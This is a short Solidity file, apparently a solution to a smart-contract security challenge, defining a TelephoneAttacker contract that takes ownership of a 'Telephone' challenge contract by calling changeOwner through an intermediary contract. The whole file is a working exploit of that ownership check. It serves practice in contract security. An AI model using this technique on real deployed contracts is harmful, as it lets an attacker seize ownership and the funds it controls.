// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import { Telephone } from "./05_Telephone.sol";

contract TelephoneAttacker {
  function attack(address challenge, address owner) public {
    Telephone(challenge).changeOwner(owner);
  }
}